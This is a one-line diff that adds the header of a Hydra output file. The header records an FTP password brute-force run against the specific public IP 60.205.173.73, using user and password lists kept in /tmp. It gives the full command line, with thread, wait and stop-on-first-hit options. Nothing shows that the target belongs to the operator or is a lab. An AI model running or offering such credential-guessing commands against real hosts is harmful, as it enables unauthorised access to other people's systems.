@@ -1,0 +1,1 @@
+# Hydra v9.2 run at 2026-08-05 06:43:35 on 60.205.173.73 ftp (hydra -L /tmp/alsz_users.txt -P /tmp/pw.txt -t 3 -W 6 -f -o /tmp/hydra_ftp_alsz.txt ftp://60.205.173.73)
